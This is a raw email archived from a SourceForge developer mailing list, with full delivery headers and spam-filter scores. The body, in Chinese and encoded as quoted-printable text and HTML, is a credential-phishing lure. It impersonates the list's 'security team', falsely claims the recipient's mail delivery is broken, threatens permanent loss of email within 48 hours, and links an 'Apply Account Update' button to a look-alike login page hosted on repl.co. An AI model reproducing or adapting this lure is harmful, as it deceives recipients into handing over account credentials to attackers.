Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id AB9F933CB48
	for <lists+industrypack-devel@lfdr.de>; Tue, 16 Mar 2021 03:10:59 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1lLzAg-00072l-GN
	for lists+industrypack-devel@lfdr.de; Tue, 16 Mar 2021 02:10:58 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <ITSERVICE@inboxxxx.cf>) id 1lLzAe-00072N-OB
 for industrypack-devel@lists.sourceforge.net; Tue, 16 Mar 2021 02:10:56 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Date:From:To:Subject:MIME-Version:Content-Type:
 Sender:Reply-To:Message-ID:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=tX4+3ii+xkYAyQFNCwXNIRpamZMjJRp5fSHq5q6gQaI=; b=Zl4C2VKXM8MdMJH5i0Puqa0fJd
 RJJnkpT37CbZ+Hy3jR14J4sBKCJaQCmlFTsbBwglwEoL/YjN0vnI2j/AUiYH+2IjbxBh4YakTm6mF
 Bb7+5dBw7OdA71PhhrInGzV3XYo0wHoQHyqz/Z2v2mrR0UXDoQAz6ta5lOXOWdpLxGkY=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Date:From:To:Subject:MIME-Version:Content-Type:Sender:Reply-To:Message-ID
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=tX4+3ii+xkYAyQFNCwXNIRpamZMjJRp5fSHq5q6gQaI=; b=k
 gaSBoZMnFCUQz6YX8rJL5XMb2vksieXxk5rmvxFUsC9Fg+mbwSXh7POHXnZPJBhfbHQBSfTYYD7e2
 QCY0hTl5Czy/xhEqFnifzEKyMLJjzjPXVmdNdhB5hMiC4lowd/uJL8YXIdGxC1sK+NrNxHHYZvfwl
 bk0l30rzGSJcWbcY=;
Received: from inboxxxx.cf ([143.198.55.77] helo=0.inboxxxx.cf)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
 id 1lLzAW-004HXj-Q9
 for industrypack-devel@lists.sourceforge.net; Tue, 16 Mar 2021 02:10:55 +0000
MIME-Version: 1.0
To: industrypack-devel@lists.sourceforge.net
From: EMAIL SERVICE <IT SERVICE<inboxxxx@inboxxxx.cf>
Date: Mon, 15 Mar 2021 18:50:19 -0700
X-Spam-Score: 7.2 (+++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: repl.co]
 1.0 HK_RANDOM_FROM         From username looks random
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or identical to
 background 1.0 MISSING_MID            Missing Message-Id: header
 0.1 TO_IN_SUBJ             To address is in Subject
 3.0 FROM_ADDR_WS           Malformed From address
X-Headers-End: 1lLzAW-004HXj-Q9
Subject: [Industrypack-devel] industrypack-devel@lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============2570776995614606232=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net
Message-Id: <E1lLzAg-00072l-GN@sfs-ml-1.v29.lw.sourceforge.com>

You will not see this in a MIME-aware mail reader.
--===============2570776995614606232==
Content-Type: multipart/alternative; boundary="===============0720715126=="

You will not see this in a MIME-aware mail reader.
--===============0720715126==
Content-Type: text/plain; charset="utf-8"
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Content-Description: Mail message body

industrypack-devel@lists.sourceforge.net =66F4=65B0=670D=52A1=5668=8B66=
=62A5
 =

 =

 =4EB2=7231=7684industrypack-devel@lists.sourceforge.net=FF0C
 =6B64=7535=5B50=90AE=4EF6=65E8=5728=901A=77E5=60A8=65B0=7684=90AE=4EF6=
=9012=9001=529F=80FD=672A=6B63=786E=9002=7528=4E8E=60A8=7684=5E10=6237=3002
 =56E0=6B64=FF0C=60A8=7684=7535=5B50=90AE=4EF6=5E10=6237=5C06=65E0=6CD5=
=63A5=6536=8D85=8FC7100KB=7684=7535=5B50=90AE=4EF6=4FE1=4EF6=3002
=5982=679C=4E0D=5E94=7528=9012=9001=529F=80FD=FF0C=60A8=7684=6765=7535=90AE=
=4EF6=5C06=88AB=6682=65F6=4E2D=6B62=3002
=8981=5E94=7528=8FD9=4E9B=5B89=5168=529F=80FD=FF0C=8BF7=5355=51FB=4E0B=6587=
=3002

 =

=767B=5F55=5230industrypack-devel@lists.sourceforge.net=670D=52A1=5668=FF1A

 =

   Apply Account Update;
 =6CE8=610F=FF1A
=8BF7=6CE8=610F=FF0C=5982=679C=60A8=672A=80FD=5728 48 =5C0F=65F6=5185=66F4=
=65B0=60A8=7684=5E10=6237=51ED=636E=FF0C=60A8=5C06=6C38=4E45=4E22=5931=8F6C=
=53D1=7ED9=60A8=7684=91CD=8981=7535=5B50=90AE=4EF6=FF0C=60A8=8FD8=9700=8981=
=9075=5FAA=5F3A=5236=6027=7684 IMAP/POP3 =914D=7F6E=FF0C=4EE5=4FBF=5C06=
=90AE=4EF6=9012=9001=529F=80FD=5E94=7528=5230=60A8=7684=5E10=6237=3002
 =611F=8C22=60A8=7684=9075=5B88=3002

 =

 =

 industrypack-devel@lists.sourceforge.net =5B89=5168=56E2=961F=FF01
--===============0720715126==
Content-Type: text/html; charset="utf-8"
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Content-Description: Mail message body

<HTML><head>
  <title></title>
  <meta content=3D"text/html; charset=3Dutf-8"
 http-equiv=3D"content-type">
  <meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19650">
</head>
<body><H4 style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-seri=
f; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; COLOR: rgb=
(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: norm=
al; TEXT-INDENT: 0px"><SPAN style=3D"COLOR: rgb(0,0,255)"><A href=3D"lists.=
sourceforge.net" target=3D_blank>industrypack-devel@lists.sourceforge.net</=
A><SPAN>&nbsp;</SPAN>=E6=9B=B4=E6=96=B0=E6=9C=8D=E5=8A=A1=E5=99=A8=E8=AD=A6=
=E6=8A=A5</SPAN></H4>
<HR style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHI=
TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
ING: normal; TEXT-INDENT: 0px">

<H4 style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHI=
TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; COLOR: rgb(51,51=
,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TE=
XT-INDENT: 0px"></H4>
<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHIT=
E-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400;=
 COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
ACING: normal; TEXT-INDENT: 0px"><STRONG><U>=E4=BA=B2=E7=88=B1=E7=9A=84indu=
strypack-devel@lists.sourceforge.net=EF=BC=8C</U></STRONG></P>
<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHIT=
E-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400;=
 COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
ACING: normal; TEXT-INDENT: 0px"><STRONG><U>=E6=AD=A4=E7=94=B5=E5=AD=90=E9=
=82=AE=E4=BB=B6=E6=97=A8=E5=9C=A8=E9=80=9A=E7=9F=A5=E6=82=A8=E6=96=B0=E7=9A=
=84=E9=82=AE=E4=BB=B6=E9=80=92=E9=80=81=E5=8A=9F=E8=83=BD=E6=9C=AA=E6=AD=A3=
=E7=A1=AE=E9=80=82=E7=94=A8=E4=BA=8E=E6=82=A8=E7=9A=84=E5=B8=90=E6=88=B7=E3=
=80=82</U></STRONG></P>
<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHIT=
E-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400;=
 COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
ACING: normal; TEXT-INDENT: 0px"><STRONG><U>=E5=9B=A0=E6=AD=A4=EF=BC=8C=E6=
=82=A8=E7=9A=84=E7=94=B5=E5=AD=90=E9=82=AE=E4=BB=B6=E5=B8=90=E6=88=B7=E5=B0=
=86=E6=97=A0=E6=B3=95=E6=8E=A5=E6=94=B6=E8=B6=85=E8=BF=87100KB=E7=9A=84=E7=
=94=B5=E5=AD=90=E9=82=AE=E4=BB=B6=E4=BF=A1=E4=BB=B6=E3=80=82<BR>=E5=A6=82=
=E6=9E=9C=E4=B8=8D=E5=BA=94=E7=94=A8=E9=80=92=E9=80=81=E5=8A=9F=E8=83=BD=EF=
=BC=8C=E6=82=A8=E7=9A=84=E6=9D=A5=E7=94=B5=E9=82=AE=E4=BB=B6=E5=B0=86=E8=A2=
=AB=E6=9A=82=E6=97=B6=E4=B8=AD=E6=AD=A2=E3=80=82<BR>=E8=A6=81=E5=BA=94=E7=
=94=A8=E8=BF=99=E4=BA=9B=E5=AE=89=E5=85=A8=E5=8A=9F=E8=83=BD=EF=BC=8C=E8=AF=
=B7=E5=8D=95=E5=87=BB=E4=B8=8B=E6=96=87=E3=80=82<BR></U></STRONG></P>
<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHIT=
E-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400;=
 COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
ACING: normal; TEXT-INDENT: 0px"></P><FONT color=3D#000000 size=3D3 face=3D=
"Times New Roman">=E7=99=BB=E5=BD=95=E5=88=B0industrypack-devel@lists.sourc=
eforge.net=E6=9C=8D=E5=8A=A1=E5=99=A8=EF=BC=9A<BR></FONT><SPAN style=3D"FON=
T-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHITE-SPACE: normal=
; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; C=
OLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inlin=
e !important; LETTER-SPACING: normal; TEXT-INDENT: 0px"></SPAN><BR style=3D=
"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHITE-SPACE: no=
rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: norm=
al; TEXT-INDENT: 0px">
<TABLE style=3D"FONT-FAMILY: tahoma,helvetica,sans-serif; BORDER-TOP-COLOR:=
 rgb(4,95,180); WORD-SPACING: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR:=
 rgb(4,95,180); COLOR: rgb(51,51,51); BORDER-BOTTOM-COLOR: rgb(4,95,180); O=
RPHANS: 2; WIDOWS: 2; BORDER-RIGHT-COLOR: rgb(4,95,180); LETTER-SPACING: no=
rmal; BACKGROUND-COLOR: rgb(4,95,180)">
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; COL=
OR: black"><A style=3D"COLOR: rgb(0,91,209)" href=3D"https://567687Mailprot=
ection-authsettings.scanmedia.repl.co/ind703stryp505ck-d604v604l109lists208=
s802703rc604f802rg604208n604t" rel=3D"noopener noreferrer" target=3D_blank>=
<SPAN style=3D"COLOR: rgb(255,255,255)">Apply Account Update;</SPAN></A></T=
D></TR></TBODY></TABLE>
<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHIT=
E-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400;=
 COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
ACING: normal; TEXT-INDENT: 0px"><FONT color=3D#000000 size=3D3 face=3D"Tim=
es New Roman">=E6=B3=A8=E6=84=8F=EF=BC=9A<BR>=E8=AF=B7=E6=B3=A8=E6=84=8F=EF=
=BC=8C=E5=A6=82=E6=9E=9C=E6=82=A8=E6=9C=AA=E8=83=BD=E5=9C=A8 48 =E5=B0=8F=
=E6=97=B6=E5=86=85=E6=9B=B4=E6=96=B0=E6=82=A8=E7=9A=84=E5=B8=90=E6=88=B7=E5=
=87=AD=E6=8D=AE=EF=BC=8C=E6=82=A8=E5=B0=86=E6=B0=B8=E4=B9=85=E4=B8=A2=E5=A4=
=B1=E8=BD=AC=E5=8F=91=E7=BB=99=E6=82=A8=E7=9A=84=E9=87=8D=E8=A6=81=E7=94=B5=
=E5=AD=90=E9=82=AE=E4=BB=B6=EF=BC=8C=E6=82=A8=E8=BF=98=E9=9C=80=E8=A6=81=E9=
=81=B5=E5=BE=AA=E5=BC=BA=E5=88=B6=E6=80=A7=E7=9A=84 IMAP/POP3 =E9=85=8D=E7=
=BD=AE=EF=BC=8C=E4=BB=A5=E4=BE=BF=E5=B0=86=E9=82=AE=E4=BB=B6=E9=80=92=E9=80=
=81=E5=8A=9F=E8=83=BD=E5=BA=94=E7=94=A8=E5=88=B0=E6=82=A8=E7=9A=84=E5=B8=90=
=E6=88=B7=E3=80=82</FONT></P>
<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHIT=
E-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400;=
 COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
ACING: normal; TEXT-INDENT: 0px"><FONT color=3D#000000 size=3D3 face=3D"Tim=
es New Roman">=E6=84=9F=E8=B0=A2=E6=82=A8=E7=9A=84=E9=81=B5=E5=AE=88=E3=80=
=82<BR></FONT></P>
<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHIT=
E-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400;=
 COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
ACING: normal; TEXT-INDENT: 0px"></P>
<HR style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif; WHI=
TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-S=
PACING: normal; TEXT-INDENT: 0px">
<STRONG style=3D"FONT-SIZE: 13px; FONT-FAMILY: tahoma,helvetica,sans-serif;=
 WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; COLOR: rgb(5=
1,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal=
; TEXT-INDENT: 0px"><A href=3D"lists.sourceforge.net" target=3D_blank>indus=
trypack-devel@lists.sourceforge.net</A><SPAN> =E5=AE=89=E5=85=A8=E5=9B=A2=
=E9=98=9F=EF=BC=81</SPAN></STRONG></BODY></HTML>
--===============0720715126==--


--===============2570776995614606232==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2570776995614606232==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2570776995614606232==--

